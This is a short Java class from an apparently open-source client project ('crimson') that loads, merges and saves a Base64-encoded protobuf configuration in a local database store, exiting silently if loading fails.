/******************************************************************************
 *                                                                            *
 *                    Copyright 2017 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.store;

import java.util.Base64;

import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.universal.stores.DatabaseStore;

public final class ConfigStore {
	private ConfigStore() {
	}

	private static ClientConfig ic;

	public static ClientConfig getConfig() {
		return ic;
	}

	public static void loadConfig() {
		try {
			ic = ClientConfig.parseFrom(Base64.getDecoder().decode(DatabaseStore.getDatabase().getString("ic")));
		} catch (Exception e) {
			System.exit(0);
		}
	}

	public static void updateConfig(ClientConfig.Builder config) {
		ic = ClientConfig.newBuilder(ic).mergeFrom(config.build()).build();
	}

	public static void saveIC() {
		DatabaseStore.getDatabase().store("ic", Base64.getEncoder().encodeToString(getConfig().toByteArray()));
	}

}
